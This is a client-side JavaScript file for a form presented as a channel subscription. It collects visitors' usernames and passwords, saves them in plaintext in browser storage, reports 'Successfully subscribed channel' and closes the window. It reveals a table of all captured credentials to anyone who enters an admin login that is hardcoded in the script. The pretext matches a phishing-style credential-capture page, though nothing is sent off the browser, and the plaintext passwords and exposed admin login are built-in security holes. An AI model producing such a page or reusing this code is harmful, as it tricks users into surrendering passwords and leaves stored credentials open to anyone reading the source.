(() => {
  const storageKey = "submissions";
  const adminUsername = "jonnagiri";
  const adminPassword = "1127@@2603";

  const form = document.getElementById("subscribeForm");
  const alertInfo = document.getElementById("alertInfo");
  const alertSuccess = document.getElementById("alertSuccess");
  const adminActions = document.getElementById("adminActions");
  const submissions = document.getElementById("submissions");
  const submissionsBody = document.getElementById("submissionsBody");
  const noSubmissions = document.getElementById("noSubmissions");
  const toggleTable = document.getElementById("toggleTable");
  const clearTable = document.getElementById("clearTable");

  function loadSubmissions() {
    try {
      const raw = localStorage.getItem(storageKey);
      if (!raw) return [];
      const parsed = JSON.parse(raw);
      return Array.isArray(parsed) ? parsed : [];
    } catch {
      return [];
    }
  }

  function saveSubmissions(items) {
    localStorage.setItem(storageKey, JSON.stringify(items));
  }

  function formatUtc(date) {
    const pad = (n) => String(n).padStart(2, "0");
    const yyyy = date.getUTCFullYear();
    const mm = pad(date.getUTCMonth() + 1);
    const dd = pad(date.getUTCDate());
    const hh = pad(date.getUTCHours());
    const mi = pad(date.getUTCMinutes());
    const ss = pad(date.getUTCSeconds());
    return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss} UTC`;
  }

  function setAlert(element, message) {
    if (!message) {
      element.classList.add("d-none");
      element.textContent = "";
      return;
    }
    element.textContent = message;
    element.classList.remove("d-none");
  }

  function escapeHtml(value) {
    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function renderTable() {
    const items = loadSubmissions();
    submissionsBody.innerHTML = "";

    if (items.length === 0) {
      noSubmissions.classList.remove("d-none");
      return;
    }

    noSubmissions.classList.add("d-none");
    items.forEach((item) => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td>${escapeHtml(item.username)}</td>
        <td>${escapeHtml(item.password)}</td>
        <td>${escapeHtml(item.createdUtc)}</td>
      `;
      submissionsBody.appendChild(tr);
    });
  }

  function hasAdminAccess() {
    const username = form.username.value.trim();
    const password = form.password.value;
    return username === adminUsername && password === adminPassword;
  }

  function updateAdminAccess() {
    const isAdmin = hasAdminAccess();
    adminActions.classList.toggle("d-none", !isAdmin);

    if (!isAdmin) {
      submissions.classList.add("d-none");
      toggleTable.textContent = "Show submissions";
    }
  }

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    setAlert(alertInfo, "");
    setAlert(alertSuccess, "");

    const username = form.username.value.trim();
    const password = form.password.value.trim();

    if (!username || !password) {
      setAlert(alertInfo, "Username and password are required.");
      return;
    }

    const items = loadSubmissions();
    items.push({
      username,
      password,
      createdUtc: formatUtc(new Date())
    });
    saveSubmissions(items);

    form.reset();
    renderTable();
    updateAdminAccess();

    setAlert(alertSuccess, "Successfully subscribed channel.");

    setTimeout(() => {
      window.close();
    }, 3000);
  });

  form.username.addEventListener("input", updateAdminAccess);
  form.password.addEventListener("input", updateAdminAccess);

  toggleTable.addEventListener("click", () => {
    if (!hasAdminAccess()) {
      updateAdminAccess();
      return;
    }

    const isHidden = submissions.classList.contains("d-none");
    submissions.classList.toggle("d-none", !isHidden);
    toggleTable.textContent = isHidden ? "Hide submissions" : "Show submissions";

    if (isHidden) {
      renderTable();
    }
  });

  clearTable.addEventListener("click", () => {
    if (!hasAdminAccess()) {
      updateAdminAccess();
      return;
    }

    if (!confirm("Clear all local submissions from this browser?")) {
      return;
    }
    saveSubmissions([]);
    renderTable();
  });

  updateAdminAccess();
})();